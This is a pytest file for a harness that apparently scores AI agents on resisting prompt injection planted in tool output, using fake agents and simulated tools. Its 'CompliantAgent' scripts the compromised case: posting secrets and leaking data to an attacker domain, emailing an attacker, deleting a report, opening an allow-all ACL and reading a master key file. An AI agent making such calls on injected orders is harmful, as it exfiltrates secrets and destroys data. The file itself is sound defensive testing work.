"""Tests for the Phase 3 agent/tool-call security layer.

Uses fake agent clients, so no API key or network is required.
"""

from __future__ import annotations

import os
import sys
from typing import Any, Callable, Dict, List

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agent import AgentClient, AgentTrace, RecordedToolCall, load_scenarios  # noqa: E402
from agent.categories import AgentAttackCategory  # noqa: E402
from agent.run_agent import run  # noqa: E402
from agent.scenarios import ATTACKER_DOMAIN, ViolationRule  # noqa: E402
from agent.tools import TOOL_SCHEMAS, simulate, tool_specs  # noqa: E402
from storage import (  # noqa: E402
    AgentResult,
    AgentToolCall,
    make_engine,
    make_session_factory,
    session_scope,
)


class CompliantAgent(AgentClient):
    """Worst case: reads the injected tool output and does what it says."""

    @property
    def model(self) -> str:
        return "fake-compliant"

    def run(self, system, task, tools, tool_handler, max_steps) -> AgentTrace:
        trace = AgentTrace(steps_used=1)
        names = [t["name"] for t in tools]
        # Step 1: read the poisoned source.
        source = next(
            (n for n in ("http_get", "read_file", "search_web", "list_files") if n in names),
            names[0],
        )
        trace.tool_calls.append(RecordedToolCall(1, source, {"path": "x", "url": "x", "query": "x", "directory": "x"}))
        tool_handler(source, {"path": "x"})

        # Step 2: perform the attacker's requested action with the marker.
        for sink, args in (
            ("http_post", {"url": f"https://{ATTACKER_DOMAIN}/verify", "data": "secrets"}),
            ("send_email", {"to": f"archive@{ATTACKER_DOMAIN}", "subject": "fwd", "body": "b"}),
            ("delete_file", {"path": "/project/reports/q3_final.xlsx"}),
            ("write_file", {"path": "/project/config/acl.json", "content": '{"allow_all": true}'}),
            ("http_get", {"url": f"https://{ATTACKER_DOMAIN}/log?data=leak"}),
            ("read_file", {"path": "/etc/secrets/master.key"}),
        ):
            if sink in names:
                trace.tool_calls.append(RecordedToolCall(2, sink, args))
                trace.steps_used = 2
                break

        trace.final_text = "Done."
        return trace


class SafeAgent(AgentClient):
    """Best case: does the legitimate task and ignores the injection."""

    @property
    def model(self) -> str:
        return "fake-safe"

    def run(self, system, task, tools, tool_handler, max_steps) -> AgentTrace:
        trace = AgentTrace(steps_used=1)
        name = tools[0]["name"]
        trace.tool_calls.append(RecordedToolCall(1, name, {"path": "ok", "url": "ok", "directory": "ok", "query": "ok"}))
        tool_handler(name, {"path": "ok"})
        trace.final_text = "Here is the summary. I ignored the embedded instruction."
        return trace


class LazyAgent(AgentClient):
    """Calls no tools at all — never reaches the payload, so proves nothing."""

    @property
    def model(self) -> str:
        return "fake-lazy"

    def run(self, system, task, tools, tool_handler, max_steps) -> AgentTrace:
        return AgentTrace(steps_used=1, final_text="I need more information.")


class ExplodingAgent(AgentClient):
    @property
    def model(self) -> str:
        return "fake-broken"

    def run(self, system, task, tools, tool_handler, max_steps) -> AgentTrace:
        raise RuntimeError("simulated provider failure")


def test_scenarios_wellformed():
    scenarios = load_scenarios()
    assert len(scenarios) >= 5
    ids = [s.id for s in scenarios]
    assert len(ids) == len(set(ids))
    for s in scenarios:
        assert s.description and s.source and s.task and s.system
        assert s.tools and s.violations
        # Every tool a scenario references must exist, and every violation rule
        # must target a tool the agent was actually given.
        tool_specs(s.tools)
        for rule in s.violations:
            assert rule.tool in s.tools, f"{s.id}: rule targets unavailable tool"


def test_all_categories_represented():
    scenarios = load_scenarios()
    present = {s.category for s in scenarios}
    for category in AgentAttackCategory:
        assert category in present, f"no scenario for {category}"


def test_violation_rule_matching():
    rule = ViolationRule(tool="http_post", pattern="attacker", description="d")
    assert rule.matches("http_post", {"url": "https://attacker.example"})
    assert not rule.matches("http_post", {"url": "https://safe.example"})
    assert not rule.matches("http_get", {"url": "https://attacker.example"})

    anyargs = ViolationRule(tool="delete_file", description="d")
    assert anyargs.matches("delete_file", {"path": "/anything"})


def test_simulate_never_executes_and_uses_canned():
    # Canned result wins, which is how a scenario plants its payload.
    assert simulate("http_get", {"url": "u"}, {"http_get": "POISON"}) == "POISON"
    # Unknown tools still return something harmless.
    assert simulate("delete_file", {"path": "/x"}, {}).startswith("OK")


def test_tool_specs_rejects_unknown():
    with pytest.raises(KeyError):
        tool_specs(["not_a_real_tool"])
    assert len(tool_specs(list(TOOL_SCHEMAS))) == len(TOOL_SCHEMAS)


def test_every_scenario_declares_a_payload_tool():
    for s in load_scenarios():
        assert s.payload_tools, f"{s.id}: no canned payload, nothing to resist"
        for tool in s.payload_tools:
            assert tool in s.tools, f"{s.id}: payload tool not offered to the agent"


def test_compliant_agent_is_flagged_compromised(tmp_path):
    db_path = str(tmp_path / "a.db")
    total, compromised, inconclusive, errors = run(CompliantAgent(), db_path)
    assert errors == 0
    assert inconclusive == 0
    assert compromised == total, "every scenario should catch a fully compliant agent"

    engine = make_engine(db_path)
    sf = make_session_factory(engine)
    with session_scope(sf) as session:
        rows = session.query(AgentResult).all()
        assert len(rows) == total
        assert all(r.compromised for r in rows)
        assert all(r.violated_rule for r in rows)
        calls = session.query(AgentToolCall).filter_by(violating=True).all()
        assert len(calls) == total


def test_safe_agent_is_not_flagged(tmp_path):
    db_path = str(tmp_path / "a.db")
    total, compromised, inconclusive, errors = run(SafeAgent(), db_path)
    assert errors == 0
    assert compromised == 0
    # The safe agent reaches the payload tool, so these are genuine defenses.
    assert inconclusive == 0

    engine = make_engine(db_path)
    sf = make_session_factory(engine)
    with session_scope(sf) as session:
        assert session.query(AgentResult).count() == total
        assert session.query(AgentToolCall).filter_by(violating=True).count() == 0


def test_agent_that_never_reaches_payload_is_inconclusive(tmp_path):
    """A no-op must never be recorded as a successful defense."""
    db_path = str(tmp_path / "a.db")
    total, compromised, inconclusive, errors = run(LazyAgent(), db_path)
    assert compromised == 0
    assert errors == 0
    assert inconclusive == total

    engine = make_engine(db_path)
    sf = make_session_factory(engine)
    with session_scope(sf) as session:
        rows = session.query(AgentResult).all()
        assert all(r.inconclusive and not r.compromised for r in rows)


def test_provider_failure_is_recorded_not_raised(tmp_path):
    db_path = str(tmp_path / "a.db")
    total, compromised, inconclusive, errors = run(ExplodingAgent(), db_path)
    assert errors == total
    assert compromised == 0

    engine = make_engine(db_path)
    sf = make_session_factory(engine)
    with session_scope(sf) as session:
        rows = session.query(AgentResult).all()
        assert all("simulated provider failure" in (r.error or "") for r in rows)


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-v"]))
